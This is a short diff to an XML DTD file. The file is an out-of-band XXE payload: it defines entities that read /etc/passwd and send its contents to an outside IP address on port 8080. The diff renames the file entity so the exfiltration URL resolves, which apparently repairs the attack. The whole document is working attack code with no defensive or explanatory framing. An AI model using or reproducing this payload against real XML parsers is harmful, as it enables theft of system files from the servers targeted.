@@ -1,6 +1,6 @@
 <!ELEMENT data (#PCDATA)>
 <!ENTITY % start "<![CDATA[">
-<!ENTITY % goodies SYSTEM "file:///etc/passwd">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % all "<!ENTITY send SYSTEM 'http://62.210.38.135:8080/?%file;'>">
 <!ENTITY % end "]]>">
-<!ENTITY combo '%start;%goodies;%all;%end;'>
+<!ENTITY combo '%start;%file;%all;%end;'>
